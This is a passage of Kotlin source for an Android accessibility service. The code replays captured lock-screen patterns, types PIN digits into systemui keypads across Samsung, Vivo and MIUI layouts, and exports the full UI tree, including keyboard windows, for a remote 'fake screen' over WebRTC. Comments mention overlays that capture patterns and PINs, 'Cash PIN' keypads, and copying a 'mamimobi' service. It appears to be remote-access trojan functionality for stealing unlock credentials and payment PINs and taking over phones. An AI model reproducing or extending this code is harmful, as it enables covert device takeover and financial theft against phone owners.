        if (!DeviceStateHelper.isInteractive(this)) {
            wakeScreenForKeyguard()
        }
        DeviceStateHelper.pokeUserActivity(this)
        tryNodeDismissLockCover()
        if (currentPatternViewBounds() != null) {
            return true
        }
        dismissLockCoverAggressively()
        if (currentPatternViewBounds() != null) {
            return true
        }
        if (!isLockCoverVisible()) {
            return waitForPatternViewVisible(timeoutMs = 3000L)
        }
        tryNodeDismissLockCover()
        dismissLockCoverAggressively()
        if (currentPatternViewBounds() != null) {
            return true
        }
        return waitForPatternViewVisible(timeoutMs = 2000L)
    }

    private fun replayPatternPoints(
        points: List<Pair<Float, Float>>,
        durationMs: Long,
    ): Boolean {
        if (points.size < 2) {
            return false
        }
        hidePatternCaptureOverlay()
        hidePinKeypadCaptureOverlay()
        markGestureActive(durationMs + 800L)
        val path = Path().apply {
            moveTo(points.first().first, points.first().second)
            for (index in 1 until points.size) {
                lineTo(points[index].first, points[index].second)
            }
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0L, durationMs))
            .build()
        val result = dispatchGestureSync(gesture, durationMs + 2000L)
        Log.i(
            "PatternCapture",
            "pattern replay points=${points.size} durationMs=$durationMs ok=${result.ok} err=${result.error}",
        )
        return result.ok
    }

    private fun beginKeyguardRemoteUnlock() {
        keyguardRemoteUnlockActive = true
        patternOverlaySuppressedUntil = System.currentTimeMillis() + PATTERN_UNLOCK_SUPPRESS_MS
        gesturePriorityUntil = System.currentTimeMillis() + PATTERN_UNLOCK_CAPTURE_PAUSE_MS
        hidePatternCaptureOverlay()
        hidePinKeypadCaptureOverlay()
        // Samsung 卸 TYPE_ACCESSIBILITY_OVERLAY / DIM_BEHIND 需要一拍，否则手势打在空盾上
        Thread.sleep(OVERLAY_DETACH_MS)
    }

    private fun endKeyguardRemoteUnlock() {
        keyguardRemoteUnlockActive = false
        patternOverlaySuppressedUntil = System.currentTimeMillis() + 1500L
        clearGestureActive()
    }

    private fun waitForPatternViewVisible(timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            if (currentPatternViewBounds() != null) {
                return true
            }
            Thread.sleep(180L)
        }
        return currentPatternViewBounds() != null
    }

    private fun currentPatternViewBounds(): Rect? {
        val node = findPatternViewAcrossWindows() ?: return null
        return try {
            if (!node.isVisibleToUser) {
                return null
            }
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            if (bounds.width() < MIN_PATTERN_VIEW_PX || bounds.height() < MIN_PATTERN_VIEW_PX) {
                null
            } else {
                bounds
            }
        } finally {
            node.recycle()
        }
    }

    fun isPatternViewVisible(): Boolean = currentPatternViewBounds() != null

    /**
     * mamimobi AccessService.m1668K: find key{N} / VivoPinkey{N} and ACTION_CLICK.
     * No progress verification — Samsung empty dots previously blocked typing.
     */
    private fun clickPinDigitMamimobi(digit: String): Boolean {
        val roots = collectInteractionRoots()
        try {
            for (root in roots) {
                for (viewId in buildDigitViewIds(digit)) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(viewId) ?: continue
                    for (node in nodes) {
                        try {
                            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                Thread.sleep(PIN_CLICK_SETTLE_MS)
                                return true
                            }
                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            if (!rect.isEmpty) {
                                performUnlockTapFireAndForget(rect.exactCenterX(), rect.exactCenterY())
                                return true
                            }
                        } finally {
                            node.recycle()
                        }
                    }
                }
            }
            for (root in roots) {
                findClickableDigit(root, digit)?.let { node ->
                    val result = clickKeyguardNode(node)
                    return result.ok
                }
            }
            cachedPinDigitCenters?.get(digit.first())?.let { (x, y) ->
                performUnlockTapFireAndForget(x, y)
                return true
            }
            cachedPinContainerRect?.let { container ->
                val (x, y) = pinDigitCoordinateFromContainer(digit.first(), container)
                performUnlockTapFireAndForget(x, y)
                return true
            }
        } finally {
            roots.forEach { it.recycle() }
        }
        return false
    }

    private fun probeAnyPinKeyAcrossWindows(): Boolean {
        for (digit in PIN_PROBE_DIGITS) {
            val roots = collectInteractionRoots()
            try {
                for (root in roots) {
                    val node = findDigitNodeByViewId(root, digit)
                    if (node != null) {
                        node.recycle()
                        return true
                    }
                    if (hasViewIdInTree(root, "com.android.systemui:id/key$digit")) {
                        return true
                    }
                }
            } finally {
                roots.forEach { it.recycle() }
            }
        }
        return false
    }

    private fun collectInteractionRoots(): List<AccessibilityNodeInfo> {
        val roots = ArrayList<AccessibilityNodeInfo>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windowList = windows
            if (!windowList.isNullOrEmpty()) {
                try {
                    for (window in windowList) {
                        val root = window.root ?: continue
                        roots.add(AccessibilityNodeInfo.obtain(root))
                        root.recycle()
                    }
                } finally {
                    windowList.forEach { it.recycle() }
                }
            }
        }
        rootInActiveWindow?.let { roots.add(it) }
        return roots
    }

    private fun performUnlockTapFireAndForget(x: Float, y: Float): ControlResult {
        val durationMs = keyguardProfile.timing.keyguardTapDurationMs
        val path = Path().apply {
            moveTo(x, y)
            lineTo(x + 2f, y + 2f)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
            .build()
        markGestureActive(durationMs)
        val holder = booleanArrayOf(false)
        if (Looper.myLooper() == Looper.getMainLooper()) {
            holder[0] = dispatchGesture(gesture, null, null)
        } else {
            val latch = CountDownLatch(1)
            captureHandler.post {
                holder[0] = dispatchGesture(gesture, null, null)
                latch.countDown()
            }
            latch.await(2, TimeUnit.SECONDS)
        }
        Thread.sleep(durationMs + 80L)
        return if (holder[0]) {
            ControlResult(true)
        } else {
            ControlResult(false, "dispatch_gesture_failed")
        }
    }

    private data class PinClickOutcome(
        val result: ControlResult,
        val trusted: Boolean = false,
    )

    private fun clickPinDigitWithVerify(
        char: Char,
        digit: String,
        root: AccessibilityNodeInfo?,
        expectedCount: Int,
    ): ControlResult {
        var lastError = "pin_digit_not_registered"

        repeat(PIN_DIGIT_MAX_ATTEMPTS) { attempt ->
            val beforeRoot = refreshInteractionRoot()
            val beforeCount = beforeRoot?.let { readEnteredPinDigitCount(it) } ?: expectedCount
            val beforeFingerprint = beforeRoot?.let { pinFeedbackFingerprint(it) }.orEmpty()
            val beforeBullets = beforeRoot?.let { countBulletsInPinArea(it, resources.displayMetrics.heightPixels) } ?: 0
            beforeRoot?.recycle()

            if (beforeCount > expectedCount) {
                return ControlResult(true)
            }

            val clickOutcome = clickKeyguardDigit(char, digit, root, attempt)
            if (!clickOutcome.result.ok) {
                lastError = clickOutcome.result.error ?: lastError
                Thread.sleep(PIN_RETRY_PAUSE_MS)
                return@repeat
            }

            Thread.sleep(keyguardProfile.timing.digitVerifyMs)

            if (!pinProgressDetectable && clickOutcome.trusted) {
                return ControlResult(true)
            }

            val afterRoot = refreshInteractionRoot()
            val afterCount = afterRoot?.let { readEnteredPinDigitCount(it) } ?: beforeCount
            val afterFingerprint = afterRoot?.let { pinFeedbackFingerprint(it) }.orEmpty()
            val afterBullets = afterRoot?.let { countBulletsInPinArea(it, resources.displayMetrics.heightPixels) } ?: beforeBullets
            afterRoot?.recycle()

            if (afterCount >= expectedCount + 1) {
                return ControlResult(true)
            }
            if (afterBullets > beforeBullets) {
                return ControlResult(true)
            }
            if (hasPinFeedbackAdvanced(beforeFingerprint, afterFingerprint)) {
                return ControlResult(true)
            }

            if (!pinProgressDetectable && attempt >= PIN_DIGIT_MAX_ATTEMPTS - 2 && clickOutcome.result.ok) {
                return ControlResult(true)
            }

            lastError = "pin_digit_not_registered"
            Thread.sleep(PIN_RETRY_PAUSE_MS)
        }

        return ControlResult(false, error = lastError)
    }

    private fun clickKeyguardDigit(
        char: Char,
        digit: String,
        root: AccessibilityNodeInfo?,
        attempt: Int,
    ): PinClickOutcome {
        val activeRoot = root ?: refreshInteractionRoot()
        val shouldRecycleRoot = root == null && activeRoot != null

        try {
            when (attempt) {
                0 -> {
                    clickDigitByNode(activeRoot, digit)?.let { return it }
                    if (shouldUseGridGestureFirst()) {
                        cachedPinDigitCenters?.get(char)?.let { (x, y) ->
                            return PinClickOutcome(performKeyguardGestureTap(x, y), trusted = true)
                        }
                    }
                }
                1 -> {
                    clickDigitByNode(activeRoot, digit)?.let { return it }
                    cachedPinDigitCenters?.get(char)?.let { (x, y) ->
                        return PinClickOutcome(
                            performKeyguardGestureTap(x + 8f, y + 8f),
                            trusted = true,
                        )
                    }
                }
                2 -> {
                    cachedPinDigitCenters?.get(char)?.let { (x, y) ->
                        return PinClickOutcome(
                            performKeyguardGestureTap(x - 8f, y - 8f),
                            trusted = true,
                        )
                    }
                }
            }
            return PinClickOutcome(clickPinByCoordinate(char), trusted = true)
        } finally {
            if (shouldRecycleRoot) {
                activeRoot?.recycle()
            }
        }
    }

    private fun shouldUseGridGestureFirst(): Boolean {
        return keyguardProfile.preferGridGestureWhenCalibrated() &&
            pinCalibrationSource == PinCalibrationSource.GRID
    }

    private fun clickDigitByNode(root: AccessibilityNodeInfo?, digit: String): PinClickOutcome? {
        root ?: return null
        findDigitNodeByViewId(root, digit)?.let { node ->
            return PinClickOutcome(clickKeyguardNode(node), trusted = true)
        }
        findClickableDigit(root, digit)?.let { node ->
            return PinClickOutcome(clickKeyguardNode(node), trusted = true)
        }
        return null
    }

    private fun clickKeyguardNode(node: AccessibilityNodeInfo): ControlResult {
        return try {
            node.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Thread.sleep(PIN_CLICK_SETTLE_MS)
                ControlResult(true)
            } else {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.isEmpty) {
                    ControlResult(false, "digit_bounds_empty")
                } else {
                    performKeyguardGestureTap(rect.exactCenterX(), rect.exactCenterY())
                }
            }
        } finally {
            node.recycle()
        }
    }

    private fun performKeyguardGestureTap(x: Float, y: Float): ControlResult {
        // Sync gesture wait + overlay passthrough was delaying/cancelling Samsung PIN taps.
        return performUnlockTapFireAndForget(x, y)
    }

    private fun buildDigitViewIds(digit: String): List<String> {
        return listOf(
            "com.android.systemui:id/key$digit",
            "com.android.systemui:id/VivoPinkey$digit",
            "com.android.systemui:id/num$digit",
            "com.android.keyguard:id/key$digit",
            "com.miui.systemui:id/key$digit",
            "com.android.systemui:id/digit_text_$digit",
            "com.samsung.android.biometrics.app:id/key$digit",
            "com.samsung.android.systemui:id/key$digit",
        )
    }

    /**
     * mamimobi AccessService.m1668K confirm keys — required on many Samsung / mixed PIN layouts.
     */
    private fun pressPinConfirmIfNeeded(root: AccessibilityNodeInfo?): Boolean {
        if (!isDeviceLocked()) {
            return false
        }
        val searchRoot = root ?: refreshInteractionRoot() ?: return false
        val ownedRoot = root == null
        try {
            for (viewId in PIN_CONFIRM_VIEW_IDS) {
                val node = findFirstNodeByViewId(searchRoot, viewId) ?: continue
                val clicked = clickKeyguardNode(node)
                if (clicked.ok) {
                    return true
                }
            }
            val byText = findNodeByTexts(searchRoot, PIN_CONFIRM_TEXTS)
            if (byText != null) {
                val clicked = clickKeyguardNode(byText)
                return clicked.ok
            }
            return false
        } finally {
            if (ownedRoot) {
                searchRoot.recycle()
            }
        }
    }

    private fun findDigitNodeByViewId(root: AccessibilityNodeInfo, digit: String): AccessibilityNodeInfo? {
        for (viewId in buildDigitViewIds(digit)) {
            val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
            if (nodes.isNullOrEmpty()) {
                continue
            }
            for (raw in nodes) {
                if (!matchesPinDigitByViewId(raw, digit)) {
                    raw.recycle()
                    continue
                }
                val picked = pickClickableNode(raw)
                raw.recycle()
                if (picked != null) {
                    return picked
                }
            }
        }
        return null
    }

    private fun scanPinDigitCentersByViewId(root: AccessibilityNodeInfo): Map<Char, Pair<Float, Float>> {
        val centers = mutableMapOf<Char, Pair<Float, Float>>()
        for (digitChar in PIN_CALIBRATION_DIGITS) {
            val node = findDigitNodeByViewId(root, digitChar) ?: continue
            try {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (!rect.isEmpty) {
                    centers[digitChar.first()] = rect.exactCenterX() to rect.exactCenterY()
                }
            } finally {
                node.recycle()
            }
        }
        return centers
    }

    private fun detectPinProgressSupport(root: AccessibilityNodeInfo): Boolean {
        // Only trust readable entered length. Empty PIN slot dots (common on Samsung)
        // previously made pinProgressDetectable=true and blocked digit entry in verify loops.
        return readEnteredPinDigitCount(root) > 0
    }

    fun dumpKeyguardTree(maxDepth: Int = 5): String {
        val root = findInteractionRoot() ?: return "keyguard_root=null"
        return try {
            buildString {
                append("manufacturer=")
                append(Build.MANUFACTURER)
                append(" model=")
                append(Build.MODEL)
                append(" sdk=")
                append(Build.VERSION.SDK_INT)
                append(" oemProfile=")
                append(keyguardProfile.id)
                append('\n')
                appendNodeTreeDump(this, root, 0, maxDepth.coerceIn(1, 8))
            }
        } finally {
            root.recycle()
        }
    }

    /**
     * UI tree dump aligned with mamimobi screenhelper (vh0):
     * - roots: active window + TYPE_INPUT_METHOD + other windows
     * - emit visible leaves; also emit labeled / clickable parents (Cash PIN 等数字在父节点 desc 上)
     * - empty leaves inherit short / clickable ancestor text|desc so 伪屏能画出 1-9
     * - no aggressive size/class filtering in full mode
     */
    fun dumpUiTree(maxDepth: Int = 24, maxNodes: Int = 2000, mode: String = "full"): JSONObject {
        val startMs = System.currentTimeMillis()
        val deadlineMs = startMs + DUMP_UI_TREE_BUDGET_MS
        // Must match WebRTC offer / click mapping (getRealMetrics). displayMetrics is often
        // shorter (excludes nav/compat insets) and makes 伪屏 Y 偏大 → 点 1 落到 4.
        val (screenWidth, screenHeight) = realDisplaySize()
        val boundedDepth = maxDepth.coerceIn(1, 32)
        val boundedNodes = maxNodes.coerceIn(50, 2500)
        val fullMode = mode.equals("full", ignoreCase = true) || mode.equals("leaf", ignoreCase = true)
        val out = JSONObject()
            .put("action", "get_ui_tree")
            .put("mode", if (fullMode) "full" else "normal")
            .put("screenWidth", screenWidth)
            .put("screenHeight", screenHeight)
            .put("oemProfile", keyguardProfile.id)
            .put("manufacturer", Build.MANUFACTURER)
            .put("model", Build.MODEL)

        val nodes = JSONArray()
        var scannedCount = 0
        var nodeCount = 0
        val roots = collectUiTreeRoots()
        out.put("windowCount", roots.size)

        var primaryPackage = ""
        val packageNames = JSONArray()
        for (entry in roots) {
            packageNames.put(entry.packageName)
        }
        if (roots.isNotEmpty()) {
            primaryPackage = roots.firstOrNull { !it.isIme }?.packageName
                ?: roots.first().packageName
        }

        var timedOut = false
        for (entry in roots) {
            if (nodeCount >= boundedNodes) {
                break
            }
            if (System.currentTimeMillis() >= deadlineMs) {
                timedOut = true
                entry.root.recycle()
                continue
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    entry.root.refresh()
                }
                val result = appendUiTreeNodes(
                    nodes = nodes,
                    node = entry.root,
                    packageName = entry.packageName,
                    depth = 0,
                    maxDepth = boundedDepth,
                    maxNodes = boundedNodes,
                    currentCount = nodeCount,
                    fullMode = fullMode,
                    leafOnly = true,
                    scannedCount = scannedCount,
                    deadlineMs = deadlineMs,
                )
                nodeCount = result.includedCount
                scannedCount = result.scannedCount
                if (result.timedOut) {
                    timedOut = true
                }
            } finally {
                entry.root.recycle()
            }
        }

        val centerNodeCount = countCenterRegionNodes(nodes, screenWidth, screenHeight)
        val elapsedMs = System.currentTimeMillis() - startMs

        out.put("packageName", primaryPackage)
        out.put("packageNames", packageNames)
        out.put("nodes", nodes)
        out.put("nodeCount", nodes.length())
        out.put("scannedNodeCount", scannedCount)
        out.put("centerNodeCount", centerNodeCount)
        out.put("truncated", nodeCount >= boundedNodes || timedOut)
        out.put("timedOut", timedOut)
        out.put("elapsedMs", elapsedMs)
        DeviceStateHelper.keyguardState(this).forEach { (key, value) ->
            out.put(key, value)
        }
        return out
    }

    /** Same space as a11y bounds + WebRTC click mapping (not resources.displayMetrics). */
    private fun realDisplaySize(): Pair<Int, Int> {
        val metrics = android.util.DisplayMetrics()
        @Suppress("DEPRECATION")
        (getSystemService(WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(metrics)
        if (metrics.widthPixels > 0 && metrics.heightPixels > 0) {
            return metrics.widthPixels to metrics.heightPixels
        }
        val fallback = resources.displayMetrics
        return fallback.widthPixels to fallback.heightPixels
    }

    private data class UiTreeTraverseResult(
        val includedCount: Int,
        val scannedCount: Int,
        val timedOut: Boolean = false,
    )

    private fun countCenterRegionNodes(nodes: JSONArray, screenW: Int, screenH: Int): Int {
        val left = (screenW * 0.12f).toInt()
        val right = (screenW * 0.88f).toInt()
        val top = (screenH * 0.18f).toInt()
        val bottom = (screenH * 0.78f).toInt()
        var count = 0
        for (index in 0 until nodes.length()) {
            val bounds = nodes.optJSONObject(index)?.optJSONObject("bounds") ?: continue
            val cx = (bounds.optInt("left") + bounds.optInt("right")) / 2
            val cy = (bounds.optInt("top") + bounds.optInt("bottom")) / 2
            if (cx in left..right && cy in top..bottom) {
                count++
            }
        }
        return count
    }

    private data class UiTreeRootEntry(
        val root: AccessibilityNodeInfo,
        val packageName: String,
        val windowId: Int,
        val layer: Int,
        val isIme: Boolean = false,
        val isActive: Boolean = false,
    )

    /**
     * mamimobi qr0 capture loop: active root + TYPE_INPUT_METHOD(2) root, then others.
     */
    private fun collectUiTreeRoots(): List<UiTreeRootEntry> {
        val entries = mutableListOf<Pair<Int, UiTreeRootEntry>>()

        rootInActiveWindow?.let { active ->
            addScoredUiRoot(
                entries,
                active,
                windowId = ACTIVE_WINDOW_ID,
                layer = Int.MAX_VALUE,
                isIme = false,
                isActive = true,
            )
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windowList = windows
            if (!windowList.isNullOrEmpty()) {
                try {
                    for (window in windowList) {
                        if (window.type != AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
                            continue
                        }
                        val root = window.root ?: continue
                        try {
                            addScoredUiRoot(
                                entries,
                                root,
                                windowId = window.id,
                                layer = window.layer,
                                isIme = true,
                                isActive = false,
                            )
                        } finally {
                            root.recycle()
                        }
                    }
                } finally {
                    windowList.forEach { it.recycle() }
                }
            }
        }

        if (entries.isEmpty()) {
            return emptyList()
        }

        val byWindowId = linkedMapOf<Int, Pair<Int, UiTreeRootEntry>>()
        for ((score, entry) in entries.sortedByDescending { it.first }) {
            if (!byWindowId.containsKey(entry.windowId)) {
                byWindowId[entry.windowId] = score to entry
            } else {
                entry.root.recycle()
            }
        }

        // active → IME → remaining (by score/layer)
        return byWindowId.values
            .sortedWith(
                compareByDescending<Pair<Int, UiTreeRootEntry>> { it.second.isActive }
                    .thenByDescending { it.second.isIme }
                    .thenByDescending { it.first }
                    .thenByDescending { it.second.layer },
            )
            .map { it.second }
    }

    private fun addScoredUiRoot(
        entries: MutableList<Pair<Int, UiTreeRootEntry>>,
        root: AccessibilityNodeInfo,
        windowId: Int,
        layer: Int,
        isIme: Boolean,
        isActive: Boolean,
    ) {
        val packageName = root.packageName?.toString().orEmpty()
        if (packageName == this.packageName) {
            return
        }
        // Allow empty packageName for some OEM IME/system roots.
        var score = scoreUiWindowRoot(root, packageName)
        if (isActive) {
            score += 20_000
        }
        if (isIme) {
            score += 15_000
        }
        score += layer
        entries.add(
            score to UiTreeRootEntry(
                root = AccessibilityNodeInfo.obtain(root),
                packageName = packageName.ifEmpty { if (isIme) "ime" else "unknown" },
                windowId = windowId,
                layer = layer,
                isIme = isIme,
                isActive = isActive,
            ),
        )
    }

    private fun scoreUiWindowRoot(root: AccessibilityNodeInfo, packageName: String): Int {
        var score = 0
        if (isSystemUiOverlayPackage(packageName)) {
            score -= 500
        }
        val rect = Rect()
        root.getBoundsInScreen(rect)
        if (!rect.isEmpty) {
            score += rect.width() * rect.height() / 8_000
        }
        score += root.childCount.coerceAtMost(40) * 8
        // L2-4: PIN 容器扫描是全树深搜，非锁屏场景没必要。
        // 只在系统 UI / 锁屏相关包名下执行。
        if (shouldProbePinContainer(packageName) && hasViewIdInTree(root, PIN_CONTAINER_VIEW_ID)) {
            score += 500
        }
        return score
    }

    private fun shouldProbePinContainer(packageName: String): Boolean {
        if (packageName.isEmpty()) return true
        val normalized = packageName.lowercase()
        if (isSystemUiOverlayPackage(packageName)) return true
        if (normalized.contains("keyguard")) return true
        if (normalized.contains("lockscreen")) return true
        // 锁屏可能处于系统状态；没有更强信号时也跑一次，但仅当 keyguard 实际 locked 时
        return runCatching {
            val km = getSystemService(KeyguardManager::class.java)
            km?.isKeyguardLocked == true
        }.getOrDefault(false)
    }

    private fun isSystemUiOverlayPackage(packageName: String): Boolean {
        val normalized = packageName.lowercase()
        return normalized == "com.android.systemui" ||
            normalized.contains("systemui") ||
            normalized == "android"
    }

    private val UI_INTERACTIVE_CLASS_HINTS = listOf(
        "TextView",
        "Button",
        "EditText",
        "ImageView",
        "ImageButton",
        "CheckBox",
        "Switch",
        "RecyclerView",
        "ListView",
        "ScrollView",
        "WebView",
        "ViewGroup",
    )

    private fun appendUiTreeNodes(
        nodes: JSONArray,
        node: AccessibilityNodeInfo,
        packageName: String,
        depth: Int,
        maxDepth: Int,
        maxNodes: Int,
        currentCount: Int,
        fullMode: Boolean,
        leafOnly: Boolean,
        scannedCount: Int,
        deadlineMs: Long = Long.MAX_VALUE,
        inheritedText: String = "",
        inheritedDesc: String = "",
    ): UiTreeTraverseResult {
        if (currentCount >= maxNodes || depth > maxDepth) {
            return UiTreeTraverseResult(currentCount, scannedCount + 1)
        }
        // L1-3: 每 64 个扫描节点检查一次时间预算，超时立即返回已有结果。
        if ((scannedCount and 0x3F) == 0 && System.currentTimeMillis() >= deadlineMs) {
            return UiTreeTraverseResult(currentCount, scannedCount + 1, timedOut = true)
        }

        var count = currentCount
        var scanned = scannedCount + 1

        val ownText = node.text?.toString()?.trim().orEmpty()
        val ownDesc = node.contentDescription?.toString()?.trim().orEmpty()
        val effectiveText = ownText.ifEmpty { inheritedText }
        val effectiveDesc = ownDesc.ifEmpty { inheritedDesc }
        val (downText, downDesc) = resolvePropagatedUiLabels(
            node = node,
            ownText = ownText,
            ownDesc = ownDesc,
            inheritedText = inheritedText,
            inheritedDesc = inheritedDesc,
        )

        // mamimobi vh0: recurse visible children; also keep labeled parents (PIN keys etc.).
        // LockPatternView 常无 text 且可能有子节点，仍需输出 bounds 供伪屏画九宫格。
        val childCount = node.childCount
        if (childCount > 0) {
            val emitParent = ownText.isNotEmpty() || ownDesc.isNotEmpty() || looksLikePatternView(node)
            if (emitParent) {
                val parentRect = Rect()
                node.getBoundsInScreen(parentRect)
                if (shouldIncludeUiNode(node, parentRect, packageName, fullMode, leafOnly = false) ||
                    looksLikePatternView(node)
                ) {
                    nodes.put(
                        buildUiNodeJson(
                            node = node,
                            rect = parentRect,
                            packageName = packageName,
                            depth = depth,
                            textOverride = ownText,
                            descOverride = ownDesc,
                        ),
                    )
                    count++
                }
            }
            var childTimedOut = false
            for (index in 0 until childCount) {
                if (count >= maxNodes) {
                    break
                }
                val child = node.getChild(index) ?: continue
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN && !child.isVisibleToUser) {
                        continue
                    }
                    val childPkg = child.packageName?.toString()?.ifEmpty { packageName } ?: packageName
                    val childResult = appendUiTreeNodes(
                        nodes = nodes,
                        node = child,
                        packageName = childPkg,
                        depth = depth + 1,
                        maxDepth = maxDepth,
                        maxNodes = maxNodes,
                        currentCount = count,
                        fullMode = fullMode,
                        leafOnly = leafOnly,
                        scannedCount = scanned,
                        deadlineMs = deadlineMs,
                        inheritedText = downText,
                        inheritedDesc = downDesc,
                    )
                    count = childResult.includedCount
                    scanned = childResult.scannedCount
                    if (childResult.timedOut) {
                        childTimedOut = true
                        break
                    }
                } finally {
                    child.recycle()
                }
            }
            return UiTreeTraverseResult(count, scanned, timedOut = childTimedOut)
        }

        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (shouldIncludeUiNode(node, rect, packageName, fullMode, leafOnly = true)) {
            nodes.put(
                buildUiNodeJson(
                    node = node,
                    rect = rect,
                    packageName = packageName,
                    depth = depth,
                    textOverride = effectiveText,
                    descOverride = effectiveDesc,
                ),
            )
            count++
        }
        return UiTreeTraverseResult(count, scanned)
    }

    /**
     * Cash PIN / Compose 常把 "1".."9"、Backspace 挂在可点击父节点上；传给空叶子供伪屏标注。
     * 长文案非交互父节点不向下传，避免整屏空节点被污染。
     */
    private fun resolvePropagatedUiLabels(
        node: AccessibilityNodeInfo,
        ownText: String,
        ownDesc: String,
        inheritedText: String,
        inheritedDesc: String,
    ): Pair<String, String> {
        if (ownText.isEmpty() && ownDesc.isEmpty()) {
            return inheritedText to inheritedDesc
        }
        val label = ownText.ifEmpty { ownDesc }
        val interactive = node.isClickable || node.isCheckable || node.isFocusable
        if (!interactive && label.length > 16) {
            return inheritedText to inheritedDesc
        }
        return (ownText.ifEmpty { inheritedText }) to (ownDesc.ifEmpty { inheritedDesc })
    }

    private fun shouldIncludeUiNode(
        node: AccessibilityNodeInfo,
        rect: Rect,
        packageName: String,
        fullMode: Boolean,
        leafOnly: Boolean,
    ): Boolean {
        if (rect.isEmpty) {
            return false
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN && !node.isVisibleToUser) {
            return false
        }
        if (leafOnly && node.childCount > 0) {
            return false
        }

        // full/leaf mode (mamimobi): any visible non-empty leaf
        if (fullMode) {
            return true
        }

        val width = rect.width()
        val height = rect.height()
        if (width < UI_TREE_MIN_BOUNDS_PX || height < UI_TREE_MIN_BOUNDS_PX) {
            return false
        }

        // 设置图案 / 锁屏图案：无 text，normal 模式也必须保留
        if (looksLikePatternView(node) && width >= MIN_PATTERN_VIEW_PX && height >= MIN_PATTERN_VIEW_PX) {
            return true
        }

        val text = node.text?.toString()?.trim().orEmpty()
        val desc = node.contentDescription?.toString()?.trim().orEmpty()
        if (text.isNotEmpty() || desc.isNotEmpty()) {
            return true
        }
        if (node.isClickable || node.isFocusable || node.isCheckable) {
            return true
        }
        if (!node.viewIdResourceName.isNullOrBlank() && width >= 24 && height >= 24) {
            return true
        }

        if (!isSystemUiOverlayPackage(packageName)) {
            val className = node.className?.toString()?.substringAfterLast('.').orEmpty()
            if (UI_INTERACTIVE_CLASS_HINTS.any { hint -> className.contains(hint, ignoreCase = true) }) {
                return width >= 12 && height >= 12
            }
            val metrics = resources.displayMetrics
            if (width >= metrics.widthPixels * 0.45 && height >= metrics.heightPixels * 0.35) {
                return true
            }
        }

        return width >= 64 && height >= 64
    }

    private fun buildUiNodeJson(
        node: AccessibilityNodeInfo,
        rect: Rect,
        packageName: String,
        depth: Int,
        textOverride: String? = null,
        descOverride: String? = null,
    ): JSONObject {
        val className = node.className?.toString()?.substringAfterLast('.').orEmpty()
        val text = textOverride ?: node.text?.toString()?.trim().orEmpty()
        val desc = descOverride ?: node.contentDescription?.toString()?.trim().orEmpty()
        return JSONObject()
            .put("className", className)
            .put("viewId", node.viewIdResourceName ?: "")
            .put("text", text)
            .put("desc", desc)
            .put("clickable", node.isClickable)
            .put("focusable", node.isFocusable)
            .put("checkable", node.isCheckable)
            .put("depth", depth)
            .put("packageName", packageName)
            .put(
                "bounds",
                JSONObject()
                    .put("left", rect.left)
                    .put("top", rect.top)
                    .put("right", rect.right)
                    .put("bottom", rect.bottom),
            )
    }

    private fun appendNodeTreeDump(
        out: StringBuilder,
        node: AccessibilityNodeInfo,
        depth: Int,
        maxDepth: Int,
    ) {
        if (depth > maxDepth) {
            return
        }
        val indent = "  ".repeat(depth)
        val rect = Rect()
        node.getBoundsInScreen(rect)
        out.append(indent)
        out.append("class=")
        out.append(node.className?.toString()?.substringAfterLast('.') ?: "?")
        out.append(" id=")
        out.append(node.viewIdResourceName ?: "-")
        out.append(" text=")
        out.append(node.text ?: "-")
        out.append(" desc=")
        out.append(node.contentDescription ?: "-")
        out.append(" click=")
        out.append(node.isClickable)
        out.append(" bounds=")
        out.append(rect.toShortString())
        out.append('\n')

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            appendNodeTreeDump(out, child, depth + 1, maxDepth)
            child.recycle()
        }
    }

    private fun readEnteredPinDigitCount(root: AccessibilityNodeInfo): Int {
        val screenH = resources.displayMetrics.heightPixels
        val dotStates = mutableListOf<Boolean>()
        collectPinIndicatorDots(root, screenH, dotStates)
        if (dotStates.size in 4..12) {
            return dotStates.count { it }
        }

        val descriptionCount = extractPinCountFromDescriptions(root, screenH)
        if (descriptionCount > 0) {
            return descriptionCount
        }

        val passwordLength = findPinPasswordFieldLength(root)
        if (passwordLength > 0) {
            return passwordLength
        }

        return countBulletsInPinArea(root, screenH)
    }

    private fun collectPinIndicatorDots(
        node: AccessibilityNodeInfo,
        screenH: Int,
        dots: MutableList<Boolean>,
    ) {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (!rect.isEmpty) {
            val viewId = node.viewIdResourceName?.lowercase().orEmpty()
            val inIndicatorBand = rect.centerY() in (screenH * 0.18f).toInt()..(screenH * 0.43f).toInt()
            val compact = rect.width() in 8..(screenH * 0.12f).toInt() &&
                rect.height() in 8..(screenH * 0.12f).toInt()
            val isDotSlot = inIndicatorBand && (
                viewId.contains("dot") ||
                    viewId.contains("pin") ||
                    viewId.contains("bouncer") ||
                    viewId.contains("password") ||
                    (compact && node.className?.contains("ImageView") == true) ||
                    (compact && node.className?.contains("View") == true && !node.isClickable)
                )
            if (isDotSlot) {
                val filled = node.isSelected ||
                    node.isChecked ||
                    node.contentDescription?.contains("已输入") == true ||
                    node.contentDescription?.contains("filled", ignoreCase = true) == true ||
                    !node.text.isNullOrBlank()
                dots.add(filled)
            }
        }

